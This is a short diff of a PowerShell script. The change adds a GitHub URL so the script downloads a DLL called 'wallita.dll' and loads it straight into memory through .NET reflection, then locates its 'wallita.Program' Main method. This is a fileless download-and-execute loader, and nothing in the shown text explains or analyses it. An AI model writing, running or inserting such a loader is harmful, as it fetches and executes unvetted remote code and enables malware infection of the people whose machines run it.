@@ -1,4 +1,4 @@
-$data = (New-Object System.Net.WebClient).DownloadData("")
+$data = (New-Object System.Net.WebClient).DownloadData("https://github.com/d1v1s38z3r0/wallita/blob/main/wallita.dll")
 $ass = [System.Reflection.Assembly]::Load($data)
 $cla = $ass.GetType("wallita.Program")
 $met = $cla.GetMethod("Main")
